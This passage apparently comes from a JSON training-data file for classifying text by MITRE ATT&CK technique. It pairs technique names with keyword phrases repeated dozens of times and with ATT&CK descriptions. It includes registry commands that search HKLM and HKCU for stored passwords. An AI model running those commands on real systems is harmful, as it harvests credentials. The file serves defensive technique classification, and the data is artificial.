    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    "SID-History ",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    " MISC::AddSid",
    "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006)."
  ],
  "service stop": [
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "ChangeServiceConfigW ",
    "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)"
  ],
  "disk wipe: disk structure wipe": [
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "overwrite or delete MBR in same sentence ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    "  master boot record wiper ",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    " MBR + overwrite/wipe",
    "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)"
  ],
  "unsecured credentials: credentials in registry": [
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    "reg query HKLM /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    " reg query HKCU /f password /t REG_SZ /s ",
    "Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)\n\n* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\n* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>"
  ],
  "event triggered execution: appinit dlls": [
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "appinit_dll",
    "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017)\n\nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. \n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)"
  ],
  "exploit public-facing application": [
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "SQL inject",
    "Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other applications with Internet accessible open sockets, such as web servers and related services.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may include [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211). \n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)"
  ],
  "remote access software": [
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    "Team Viewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " TeamViewer ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " VNC ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Ammy ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " Go2Assist ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " LogMeing ",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    " AmmyAdmin",
    "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, AnyDesk, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries.(Citation: Symantec Living off the Land)\n\nRemote access tools may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system. Installation of many remote access tools may also include persistence (ex: the tool's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)).\n\nAdmin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns.(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)"
  ],
  "system binary proxy execution": [
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
